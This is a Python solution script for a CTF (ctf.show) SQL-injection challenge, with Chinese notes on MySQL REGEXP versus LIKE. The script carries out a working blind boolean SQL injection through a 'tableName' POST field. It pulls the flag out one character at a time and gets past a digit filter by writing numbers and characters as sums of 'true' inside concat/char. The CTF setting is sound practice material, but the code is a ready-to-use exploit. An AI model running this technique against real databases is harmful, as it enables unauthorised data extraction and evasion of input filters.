import requests

url = "http://df8cda56-6c74-4568-a019-7aaa42227377.challenge.ctf.show/select-waf.php"
result = "^ctfshow"

def trans(str):
    ans = 'concat('
    for i in str:
        if i == '0':
            ans += 'false,'
        elif '1' <= i <= '9':
            ans += 'true'
            for j in range(ord(i)-48-1):
                ans += '+true'
            ans += ','
        else:
            ans = ans + 'char(true'
            for j in range(ord(i)-1):
                ans += '+true'
            ans += '),'
    ans = ans[:-1]
    ans += ')'

    #print(ans)
    return ans

for i in range(1,50):
    for j in "1234567890abcdefghijopqrstuvwxyz{}-":
        payload = f"ctfshow_user group by pass having pass regexp({trans(result + j)})"
        #print(payload)
        response = requests.request("POST", url=url, data={"tableName":payload})
        if '$user_count = 1;' in response.text:
            result += j
            print(result)
            break
    print("1")



"""
1.regexp()是正则匹配，符合就返回1，否则0，可以模糊匹配(在字符串前面加'^')
2.这道题把数字过滤了，一个绕过方法是用mysql的concat(true,true+true)拼接，脚本已经写好

关于模糊匹配：
LIKE：
    支持 %（匹配任意字符序列）和 _（匹配任意单个字符）。
    不支持复杂的模式匹配。
    例如：name LIKE 'A%' 匹配以 A 开头的字符串。
REGEXP：
    支持正则表达式的所有功能，包括复杂的模式匹配。
    例如：name REGEXP '^A.*ing$' 匹配以 A 开头且以 ing 结尾的字符串。
"""